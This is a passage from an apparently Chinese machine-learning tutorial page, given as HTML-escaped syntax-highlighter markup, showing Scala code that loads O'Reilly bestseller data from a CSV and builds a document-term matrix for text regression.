&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//获取案例数据&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/users/.../TextRegression_Example_4.csv&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDataFromCSV&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;CSVReader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-13&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documents&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;drop&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toInt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;documents&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a3269937307-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a3269937307-18&quot;&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0031 seconds] --&gt;
&lt;p&gt;现在我们得到了 O’Reilly 出版社最畅销100部图书的书名、排序和详细说明。然而，当涉及某种回归分析时，我们需要数字数据。这就是问什么我们要建立一个&lt;a href=&quot;http://en.wikipedia.org/wiki/Document-term_matrix&quot;&gt;文档词汇矩阵 (DTM&lt;/a&gt;)。注意这个 DTM 与我们在垃圾邮件分类实例中建立的词汇文档矩阵 (TDM) 是类似的。区别在于，DTM 存储的是文档记录，包含文档中的词汇，相反，TDM 存储的是词汇记录，包含这些词汇所在的一系列文档。&lt;/p&gt;
&lt;p&gt;我们自己用如下代码生成 DTM：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613a6559338836&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
import java.io.File
import scala.collection.mutable

class DTM {

  var records: List[DTMRecord] = List[DTMRecord]()
  var wordList: List[String] = List[String]()

  def addDocumentToRecords(documentName: String, rank: Int, documentContent: String) = {
    //Find a record for the document
    //找出一条文档记录
    val record = records.find(x =&amp;gt; x.document == documentName)
    if (record.nonEmpty) {
      throw new Exception(&quot;Document already exists in the records&quot;)
    }

    var wordRecords = mutable.HashMap[String, Int]()
    val individualWords = documentContent.toLowerCase.split(&quot; &quot;)
    individualWords.foreach { x =&amp;gt;
      val wordRecord = wordRecords.find(y =&amp;gt; y._1 == x)
      if (wordRecord.nonEmpty) {
        wordRecords += x -&amp;gt; (wordRecord.get._2 + 1)
      }
      else {
        wordRecords += x -&amp;gt; 1
        wordList = x :: wordList
      }
    }
    records = new DTMRecord(documentName, rank, wordRecords) :: records
  }

  def getStopWords(): List[String] = {
    val source = scala.io.Source.fromFile(new File(&quot;/Users/.../stopwords.txt&quot;))(&quot;latin1&quot;)
    val lines = source.mkString.split(&quot;n&quot;)
    source.close()
    return lines.toList
  }

  def getNumericRepresentationForRecords(): (Array[Array[Double]], Array[Double]) = {
    //First filter out all stop words:
    //首先过滤出所有停用词
    val StopWords = getStopWords()
    wordList = wordList.filter(x =&amp;gt; !StopWords.contains(x))

    var dtmNumeric = Array[Array[Double]]()
    var ranks = Array[Double]()

    records.foreach { x =&amp;gt;
      //Add the rank to the array of ranks
      //将评级添加到排序数组中
      ranks = ranks :+ x.rank.toDouble

      //And create an array representing all words and their occurrences 
      //for this document:
      //为该文档创建一个数组，表示所有单词及其出现率 
      var dtmNumericRecord: Array[Double] = Array()
      wordList.foreach { y =&amp;gt;

        val termRecord = x.occurrences.find(z =&amp;gt; z._1 == y)
        if (termRecord.nonEmpty) {
          dtmNumericRecord = dtmNumericRecord :+ termRecord.get._2.toDouble
        }
        else {
          dtmNumericRecord = dtmNumericRecord :+ 0.0
        }
      }
      dtmNumeric = dtmNumeric :+ dtmNumericRecord

    }

    return (dtmNumeric, ranks)
  }
}

class DTMRecord(val document : String,
                val rank : Int,
                var occurrences :  mutable.HashMap[String,Int]
                )&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-75&quot;&gt;75&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-76&quot;&gt;76&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-77&quot;&gt;77&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613a6559338836-78&quot;&gt;78&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;collection&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;mutable&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-3&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-4&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;DTM&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613a6559338836-5&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613a6559338836-6&quot;&gt;
